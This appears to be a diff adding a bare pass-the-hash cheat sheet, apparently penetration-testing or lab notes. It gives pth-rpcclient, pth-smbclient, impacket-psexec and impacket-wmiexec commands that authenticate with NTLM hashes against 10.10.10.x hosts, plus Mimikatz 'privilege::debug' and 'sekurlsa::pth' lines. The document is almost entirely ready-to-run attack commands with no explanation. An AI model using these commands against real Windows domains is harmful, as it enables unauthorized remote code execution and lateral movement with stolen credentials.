@@ -1,0 +1,13 @@
+pth-rpcclient -U domain/user --pw-nt-hash 'aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d' --dest-ip 10.10.10.100
+
+pth-rpcclient -U domain/user%aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d server.lab
+
+pth-smbclient -U domain/user%aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d //10.10.10.100/c$
+
+impacket-psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee Administrator@10.10.10.100
+
+impacket-wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee Administrator@10.10.10.190
+
+[Mimikatz]
+privilege::debug
+sekurlsa::pth /user:qwery /domain:domain.local /ntlm:184fb5e5178480be64824d4cd53b99ee
